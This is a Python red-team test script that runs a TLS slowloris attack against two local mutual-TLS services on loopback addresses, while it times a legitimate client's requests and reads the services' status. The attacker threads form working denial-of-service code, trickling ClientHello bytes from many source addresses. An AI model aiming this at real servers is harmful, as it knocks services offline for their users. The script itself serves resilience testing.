#!/usr/bin/env python3
"""Red team, wave 2: TLS slowloris against the mutual-TLS listeners in
netns rdr-rob (run inside it with the AutoSecOps venv python):
agentd's control plane (rt-ugv-001, 127.0.0.1:8788) and
robodr-anchor-receiver (127.0.0.1:7462).

usage: redteam2_tls.py RUN_DIR cp|anchor SOURCES CONNS_PER_SOURCE SECONDS

Each attacker connection comes from its own loopback source address
(127.0.0.10 + i), sends the first bytes of a TLS ClientHello one byte per
second and reopens when cut. Meanwhile the legitimate client is measured
every 2 s: for `cp` a SOC-signed GET over mutual TLS; for `anchor`
agentd's anchor counters (status.json) and the receiver's held seq.
"""
import asyncio, json, os, socket, subprocess, sys, threading, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

run, target, nsrc, per, secs = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]), float(sys.argv[5])
port = 8788 if target == "cp" else 7462
B = os.environ.get("ROBODR_BIN", "/home/user/wt/target-soak/release")
HELLO = bytes.fromhex("160301020001" "0001fc0303") + os.urandom(32)
stop = threading.Event()
stats = {"opened": 0, "refused": 0, "cut": 0, "bytes": 0}
lock = threading.Lock()


def attacker(src):
    while not stop.is_set():
        s = socket.socket()
        try:
            s.bind((src, 0)); s.settimeout(3); s.connect(("127.0.0.1", port))
        except OSError:
            with lock:
                stats["refused"] += 1
            s.close(); time.sleep(0.5); continue
        with lock:
            stats["opened"] += 1
        try:
            for b in HELLO:
                if stop.is_set():
                    break
                s.send(bytes([b]))
                with lock:
                    stats["bytes"] += 1
                time.sleep(1.0)
        except OSError:
            with lock:
                stats["cut"] += 1
        s.close()


threads = [threading.Thread(target=attacker, args=(f"127.0.0.{10 + i}",), daemon=True)
           for i in range(nsrc) for _ in range(per)]


def anchor_view():
    try:
        st = json.load(open(f"{run}/rt/spool/status.json"))
        bb = st.get("blackbox", {}); d = st.get("daemon", {})
        a = {"anchor_failures": bb.get("anchor_failures"), "mark_failures": bb.get("mark_failures"),
             "head_marks": d.get("head_marks"), "head_mark_errors": d.get("head_mark_errors")}
    except (OSError, ValueError):
        a = {}
    r = subprocess.run([f"{B}/robodr-anchor-receiver", "status", "--config", f"{run}/anchor-rx/receiver.json"],
                       capture_output=True, text=True)
    try:
        a["held_seq"] = json.loads(r.stdout)["units"][0]["held_seq"]
    except (ValueError, KeyError, IndexError):
        a["held_seq"] = None
    return a


async def main():
    samples = []
    soc = None
    if target == "cp":
        import soclib
        soc = soclib.Soc(run, "rt-ugv-001", url="https://127.0.0.1:8788")

    async def probe():
        if soc:
            t = time.monotonic()
            try:
                st, _ = await asyncio.wait_for(soc.get(), 20)
                return {"ok": st == 200, "status": st, "ms": round((time.monotonic() - t) * 1000)}
            except Exception as e:  # noqa: BLE001
                return {"ok": False, "error": type(e).__name__, "ms": round((time.monotonic() - t) * 1000)}
        return anchor_view()

    base = [await probe() for _ in range(3)]
    for t in threads:
        t.start()
    t0 = time.monotonic()
    while time.monotonic() - t0 < secs:
        await asyncio.sleep(2)
        samples.append(await probe())
    stop.set()
    await asyncio.sleep(3)
    after = [await probe() for _ in range(3)]
    out = {"target": target, "sources": nsrc, "conns_per_source": per, "secs": secs, "attacker": stats,
           "baseline": base, "after": after}
    if soc:
        ok = [s for s in samples if s.get("ok")]
        out["during"] = {"probes": len(samples), "ok": len(ok),
                         "ms_ok": sorted(s["ms"] for s in ok)[len(ok) // 2] if ok else None,
                         "errors": sorted({s.get("error") or str(s.get("status")) for s in samples if not s.get("ok")})}
    else:
        out["during_first_last"] = [samples[0], samples[-1]] if samples else []
    print(json.dumps(out))
    json.dump(out, open(f"{run}/redteam2_tls_{target}_{nsrc}x{per}.json", "w"), indent=1)


asyncio.run(main())
